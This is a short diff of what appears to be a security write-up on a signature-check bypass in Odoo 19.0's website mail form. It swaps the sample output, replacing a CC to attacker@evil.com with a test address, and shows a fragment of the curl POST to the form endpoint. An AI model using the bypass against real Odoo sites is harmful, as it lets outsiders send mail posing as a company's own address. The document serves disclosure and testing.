@@ -124,11 +124,11 @@ curl -s -X POST http://target/website/form/mail.mail \
 I tested on a clean `odoo:19.0` Docker image with no mail server configured, which makes the negative control clean: any real SMTP attempt has to fail at connect, and that failure is the evidence the send path ran. The bypass request created the record and Odoo tried to deliver it:
 
 ```text
-mail.mail record created (id=24)
-  subject        = Odoo signature bypass test
-  email_to       = False            <- empty: this is what skips the check
-  email_cc       = attacker@evil.com
-  email_from     = "Acme form submission" <info@acme.test>   (the company address)
+mail.mail record created (id=8)
+  subject        = Security Test - Signature Bypass
+  email_to       = False                       <- empty: this is what skips the check
+  email_cc       = test-false-positive@example.com
+  email_from     = "Acme Security Corp form submission" <info@acme-security.test>
   state          = exception
   failure_reason = 111 Connection refused
 ```
